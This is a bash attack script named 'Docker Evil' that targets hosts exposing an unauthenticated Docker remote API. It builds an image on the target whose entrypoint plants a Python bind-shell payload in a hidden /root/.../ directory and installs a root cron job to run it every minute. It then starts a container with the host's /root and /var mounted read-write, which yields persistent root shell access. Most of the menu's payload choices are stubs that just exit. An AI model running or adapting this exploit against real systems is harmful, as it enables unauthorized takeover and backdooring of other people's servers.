#!/bin/bash

# Skiddie
# No SSH-BS!

echo "                   @@/.......(((((((#&@@.                            "
echo "               (#.........#((((((((((((((((@@                        "
echo "             @,.......  *((((  (((((((((((((((%@                     "
echo "            @@@@@&%###(  ((  #(((((((((((((((((((@(                  "
echo "           &((((((((((((#  ((((((((((((((((((((((((&(                "
echo "          @((((((((((((  ((  ((((((((((((((((((((((((@               "
echo "         ##((((((((((  ((((((  (((((((((((((((((((((((%&             "
echo "         @((#%%%%#((((((#%%%%%%#((((#%%%%%%#(((((#%%%%#(@            "
echo "         @(((((((((((((((((((((((((((((((((((((((((((((((@           "
echo "         ,.......................................,%@@#(((#%&&@@      "
echo "                        ,#//*          (/((((         @#((((((((%&   "
echo "                      ((##((/  ((((/(  (((#(#/       @((((##((((((@( "
echo "                       ##(((((,#(#(((  #((#(#%       @((((%.  .*     "
echo "                        /#  #.(#(#(((                @((((@          "
echo "                           ##(((/%                   *%(@,           "
echo "                          ###(///     #(((   #/(%,     *             "
echo "                            %(((/   ./((((((*(#(#(/                  "
echo "                                     #####( ##(#(((                  "
echo "                                       ((.     .(#/                  "
echo "________                 __                  ___________     .__.__   "
echo "\______ \   ____   ____ |  | __ ___________  \_   _____/__  _|__|  |  "
echo " |    |  \ /  _ \_/ ___\|  |/ // __ \_  __ \  |    __)_\  \/ /  |  |  "
echo " | __ /   (  <_> )  \___|    <\  ___/|  | \/  |    |_ /\\   /|  |  |__"
echo "/_______  /\____/ \___  >__|_ \\___  >__|    /_______  / \_/ |__|____/"
echo "        \/            \/     \/    \/                \/               "

#	PART ONE 	-	RECEIVING IP AND PORT
## Receives user input - HOST:PORT
HOST="$1"
if [ $HOST != " " &> /dev/null ]
	then
## Checking if Docker API is infact running on the given host and port
		CHECK=$(curl -sm 5 http://$HOST/images/json &> /tmp/djson.txt; echo $?)
			if [ $CHECK != 0 ]
				then
						echo -e "\n Please check if you entered the host and port correctly... Something wrong isn't right x.x"
						rm /tmp/djson.txt
						exit 1		# Exit error 1 == Host or port seems to be wrong...
				else

## PART TWO 	- GETTING IMAGE ID AND STORING IT
					## Getting image ID
					echo -e "\nGetting image ID..."
					cat /tmp/djson.txt | json_pp | awk '/sha256:/ {print $3}' | tr -d '"' | tr -d ',' | cut -d ":" -f2,2 > /tmp/IMG_ID.dkr
					IMG_ID=$(head -n1 /tmp/IMG_ID.dkr)
					rm /tmp/djson.txt
					rm /tmp/IMG_ID.dkr
					echo -e "Done\n"
## 		Closing the "Checking Docker API" IF statement
			fi


### PART TREE	 - CHOOSING PAYLOAD
	echo -e "\n Which payload would you like to use?"
	echo -e "So far we have: bash, perl, python, php, ruby. Please feel free to add to it. \n"
	read payload

	if [ $payload == "bash" ]
		then
			exit 2

	elif [ $payload == "perl" ]
		then
			exit 2
	elif [ $payload == "python" ]
		then
			export pytpay="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('127.0.0.1',1995));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
			echo -e "FROM $IMG_ID \nUSER root \nENTRYPOINT mkdir /root/... ; echo \"python -c \\\"$pytpay\\\" \">> /root/.../... ; chmod +x /root/.../... ; echo \"* * * * * /root/.../... \" > /var/spool/cron/root" > Dockerfile

	elif [ $payload == "php" ]
		then
			exit 2
	elif [ $payload == "ruby" ]
		then
			exit 2
## Closing the payload IF statement
	fi


	#### PART FOUR	 - Handling Dockerfile compression and image build
	##	Checking the compression
		bool=$(tar -cf dockerevil.tar Dockerfile; echo $?)
		if [ $bool -eq 0 ]
		then
			echo -e "Compression done...\n"
			rm Dockerfile
		else
			## If you're having trouble here, try checking if the Dockerfile was indeed created. I didn't direct any error output here, so you can have a chance to see what's wrong if shit happens
			echo -e "Ooops... Looks like something went wrong while compressing the Dockerfile... I'm gonna go ahead and leave...\n"
			sleep 1
			## Error 3 == Something went wrong during the compression of the Dockerfile
			exit 3
		## Closing the Check for compression success if statement
		fi

		## Building image
			echo "Building the image..."
			BUILD_ID=$(curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" | awk '/built/ {print $3}' | sed 's/.\{5\}$//')
			echo "Done"

			## Creating image
			echo "Creating image..."
			IMG_ID=$(curl -H "Content-Type: application/json" -d '{"Image" : "'"$BUILD_ID"'", "Binds" : ["/root/:/root/:rw,z", "/var/:/var/:rw,z" ]}' -XPOST "http://$HOST/containers/create" | awk -F ":" ' {print $2} '| awk -F "," ' {print $1}' | sed 's/"//g')
			echo "Done"
			rm dockerevil.tar

			## Starting image
			echo "Starting image"
			curl -s -XPOST http://$HOST/containers/$IMG_ID/start -v
			echo "Done"

	else
		echo "You need to set the host and port along with the script... SCRIPT HOST:PORT"
		exit 2 					# Exit error 2 == no HOST:PORT was given
## Closing the "Receives user input" IF statement (it started on line 41)
fi
